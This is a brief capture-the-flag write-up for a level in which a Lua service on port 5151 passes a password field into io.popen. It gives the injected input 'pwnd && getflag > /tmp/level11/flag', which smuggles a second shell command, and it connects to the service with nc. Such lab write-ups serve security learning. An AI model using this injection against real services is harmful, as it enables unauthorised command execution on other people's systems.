# Level11

![image](https://user-images.githubusercontent.com/29956389/90311402-d0883880-defa-11ea-9cff-3f4180b25e1f.png)

The lua script seem to be listening to port 5151, check it with `ss -ln`.

We see the `io.popen` call which executes the code
inside it. We also see that it concatenates the user's password to the command to execute.

So simply connect to the server with:

`$ nc localhost 5151`

And type `pwnd && getflag > /tmp/level11/flag` as password.

And read the flag from the `/tmp/level11/flag` file.
